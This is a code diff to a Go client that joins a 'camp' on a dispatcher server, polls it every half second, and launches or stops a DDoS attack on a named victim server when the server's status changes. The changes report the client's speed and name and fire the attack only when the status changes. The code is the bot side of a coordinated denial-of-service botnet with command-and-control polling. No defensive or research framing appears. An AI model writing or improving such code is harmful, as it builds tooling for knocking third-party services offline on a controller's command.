@@ -8,6 +8,7 @@ import (
 	"github.com/fatih/color"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -36,9 +37,7 @@ func (c *Client) Ping() error {
 }
 
 func (c *Client) GetCamp() CampAPI {
-	//get request to dispatcher server /camp
-
-	rq, err := http.NewRequest("GET", c.DispatcherServer+"/camp?speed=100", nil)
+	rq, err := http.NewRequest("GET", c.DispatcherServer+"/camp?speed="+strconv.Itoa(c.Speed)+"&name="+c.Name, nil)
 	if err != nil {
 		return CampAPI{}
 	}
@@ -83,7 +82,7 @@ func (c *Client) JoinCamp() error {
 	return errors.New(msg)
 }
 
-func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) {
+func (c *Client) ListenAndDo(changedDataChan chan CampAPI, logChan chan string) {
 	defer func() {
 		if r := recover(); r != nil {
 			//clear screen
@@ -93,36 +92,35 @@ func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) 
 		}
 	}()
 	prevCmp := c.GetCamp()
-	ChangedDataChan <- prevCmp
+	changedDataChan <- prevCmp
 	stopchan := make(chan bool, 1)
 	stopchan <- false
-
-	var cmp CampAPI
 	for {
-		cmp = c.GetCamp()
+		cmp := c.GetCamp()
 		if yes, message := cmp.Equals(prevCmp); !yes {
 			select {
-			case <-ChangedDataChan:
+			case <-changedDataChan:
 			default:
 			}
-			ChangedDataChan <- cmp
+			changedDataChan <- cmp
 			logChan <- message
-			if cmp.Settings.Status == "attacking" {
-				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
-			}
-			if cmp.Settings.Status == "stopped" {
-				select {
-				case <-stopchan:
-				default:
+			if cmp.Settings.Status != prevCmp.Settings.Status {
+				if cmp.Settings.Status == "attacking" {
+					go c.StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
 				}
-				stopchan <- true
+				if cmp.Settings.Status == "stopped" {
+					select {
+					case <-stopchan:
+					default:
+					}
+					stopchan <- true
+				}
 			}
 			prevCmp = cmp
 		}
 		time.Sleep(500 * time.Millisecond)
 	}
 }
-
 func (c *Client) Start() {
 	err := c.JoinCamp()
 	if err != nil {
